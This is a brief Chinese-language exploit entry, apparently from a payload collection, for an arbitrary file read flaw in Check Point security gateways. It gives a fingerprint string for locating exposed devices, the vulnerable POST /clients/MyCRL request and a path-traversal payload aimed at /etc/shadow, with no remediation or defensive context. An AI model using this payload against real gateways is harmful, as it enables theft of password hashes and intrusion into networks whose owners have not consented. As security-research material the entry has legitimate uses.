# CheckPoint安全网关存在任意文件读取漏洞

CheckPoint ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Check_Point-SSL-Extender"`
- **请求**：`POST /clients/MyCRL HTTP/1.1`

**Payload**
```
aCSHELL/../../../../../../../etc/shadow
```